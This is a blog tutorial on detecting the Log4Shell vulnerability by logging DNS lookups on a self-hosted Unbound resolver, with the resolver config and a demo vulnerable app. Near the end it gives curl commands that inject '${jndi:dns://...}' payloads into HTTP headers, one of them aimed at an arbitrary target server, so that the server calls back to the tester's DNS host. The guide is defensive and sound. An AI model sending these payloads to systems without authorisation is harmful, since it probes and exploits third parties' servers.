---
title: Check Log4Shell vulnerability using Unbound DNS server
excerpt: Check vulnerability without relying on third-party services
date: 2021-12-17
updated: 2022-02-12
tags:
- security
- aws
---

> (Edit: 12 Feb 2022) AWS CDK stack is available at [curben/aws-scripts](https://gitlab.com/curben/aws-scripts/-/tree/main/log4shell-stack)

Most of the publications discussing the Log4Shell/[Log4j](https://blogs.apache.org/foundation/entry/apache-log4j-cves) vulnerability ([[1]](https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java), [[2]](https://www.lunasec.io/docs/blog/log4j-zero-day/), [[3]](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/), [[4]](https://arstechnica.com/information-technology/2021/12/minecraft-and-other-apps-face-serious-threat-from-new-code-execution-bug/)) focus on the ability to instruct the JNDI component to load remote code or download payload using [LDAP](https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol). A less known fact is that Log4j also supports DNS protocol by default, at least in versions prior to 2.15.0.

Huntress, a cyber security company, created an easy-to-use tool at [log4shell.huntress.com](https://log4shell.huntress.com/) to detect whether your server is vulnerable using LDAP. Despite the assurance of transparency by the availability of [source code](https://github.com/huntresslabs/log4shell-tester) so you could host it yourself, there's no denying the fact that log4shell.huntress.com is a _third-party_ service; even if anyone could host it, not everyone has the ability to audit the source code. Another third-party service that is mentioned around is [dnslog.cn](http://www.dnslog.cn/) which detects (as the name implies) using DNS protocol.

Since the DNS request made by Log4j is just a simple DNS lookup—similar to a web browser's request—we can run any kind of DNS server: authoritative or recursive. Recursive DNS server is the easier option because it simply forwards request to upstream authoritative server(s). If a server is vulnerable, we'll see its IP address in the DNS server's query logs when we attempt the exploit.

## Setup DNS server

Unbound is a popular DNS server due to its simplicity. dnsmasq is another option, it was the default dns caching in Ubuntu before being replaced by systemd-resolved.

When installing a server (web, DNS, app, etc), Ubuntu usually starts the service immediately after installation. I prefer to properly configure a server before starting it, so I'm going to _mask_ it first to prevent that auto-start.

> Except for checking service status, log and dns query, all commands require `sudo` privilege.

```
systemctl mask unbound
```

Above command may fail in a script, in that case, use `ln -s /dev/null /etc/systemd/system/unbound.service` instead.

Then, we can proceed to install and configure it.

```
apt update
apt install unbound
sudo -e /etc/unbound/unbound.conf.d/custom.conf
```

_`sudo -e` is preferred over `sudo nano` for [security reason](https://teddit.net/r/linux/comments/osah05/ysk_do_not_use_sudo_vimnanoemacs_to_edit_a_file/)._

Paste the following config.

``` yml
# Based on https://www.linuxbabe.com/ubuntu/set-up-unbound-dns-resolver-on-ubuntu-20-04-server
server:
  # the working directory.
  directory: "/etc/unbound"

  # run as the unbound user
  username: unbound

  # uncomment and increase to get more logging
  # verbosity: 2

  # log dns queries
  log-queries: yes

  # listen on all interfaces,
  interface: 0.0.0.0
  # comment out to support IPv6.
  # interface: ::0
  # answer queries from the local network only, change to your private IP
  # interface: 192.168.0.2

  # perform prefetching of almost expired DNS cache entries.
  prefetch: yes

  # respond to all IP
  access-control: 0.0.0.0/0 allow
  # IPv6
  # access-control: ::0/0 allow

  # respond to local network only, change the CIDR according to your network
  # access-control: 192.168.88.0/24 allow

  # localhost only
  # access-control: 127.0.0.1/24 allow

  # hide server info from clients
  hide-identity: yes
  hide-version: yes

remote-control:
  # Disable unbound-control
  control-enable: no

forward-zone:
  # Forward all queries to Quad9, use your favourite DNS
  name: "."
  forward-addr: 9.9.9.9
  forward-addr: 149.112.112.112
```

<kbd>Ctrl</kbd> + <kbd>X</kbd> to quit, <kbd>Y</kbd> to save, <kbd>Enter</kbd> to confirm.

> With the above config, Unbound will respond to _all_ IP, including _public_ IP if exposed to internet.

Since Unbound will listen on all interfaces, it'll interfere with systemd-resolved which listens on 127.0.0.53:53 by default. So, before we start Unbound, systemd-resolved needs to be disabled first.

```
systemctl disable --now systemd-resolved
```

We also need to add the server's hostname to `/etc/hosts`, otherwise `sudo` will take a long time to execute. If you're using AWS EC2, the hostname will be "ip-_a_-_b_-_c_-_d_" where _abcd_ is the private IP.

```
sudo -e /etc/hosts
# append this line
127.0.0.1 ip-a-b-c-d
```

The last step before we start the service is to configure the firewall to allow inbound DNS traffic. I recommend not to allow all IP (0.0.0.0, ::0), otherwise you'll get unwanted traffic. In EC2, that means the attached security group.

After we configure the firewall, we can proceed to unmask and start the DNS server.

```
systemctl unmask unbound
systemctl enable --now unbound
```

To see whether it's working, execute some queries:

```
# localhost
dig example.com @127.0.0.1

# other machine, same subnet
dig example.com @192.168.0.x

# other machine over internet
dig example.com @public-ip
```

Verify Unbound is logging queries,

```
journalctl -xe -u unbound
# Dec 14 01:23:45 ip-a-b-c-d unbound[pid]: [pid:0] info: 127.0.0.1 example.com. A IN
```

We are now ready to test Log4shell vulnerability.

## Demo vulnerable app

> This is an optional step to demonstrate Log4shell.

A demo vulnerable is available as a Docker image at [christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app). For best security practice, I recommend:

1. Run it in an isolated network or environment.
2. Clone (the repo) and build it, instead of running the prebuild image.

After building the image and just before you run it, configure the relevant firewall to restrict outbound connection to the Unbound DNS server only. If you prefer to use port 80 for the app server, run `docker run -p 80:8080 --name vulnerable-app vulnerable-app`. Open inbound port 8080 (or port 80) in the firewall.

To test the app server is reachable, send a test request.

```
curl -IL app-server-ip:8080 -H 'X-Api-Version: foo'
```

The app server should respond HTTP 200. The header must be `X-Api-Version` because that's what configured in the log4shell-vulnerable-app.

Once the connection is verified, we can now instruct it to make a DNS request to our Unbound DNS.

```
curl -L app-server-ip:8080 -H 'X-Api-Version: ${jndi:dns://dns-server-ip/evil-request}'
```

In the Unbound's log, the query should be listed.

```
journalctl -xe -u unbound
# Dec 14 01:23:45 ip-a-b-c-d unbound[pid]: [pid:0] info: app-server-ip evil-request. A IN
```

If you want to see the query log in realtime, `journalctl -xe -u unbound -f`. If it's not listed, check the inbound firewall rule applied to the DNS server.

## Is that server vulnerable?

```
curl -L https://target-server-domain -H 'User Agent: ${jndi:dns://dns-server-ip/should-not-show-up-in-the-log}'
```
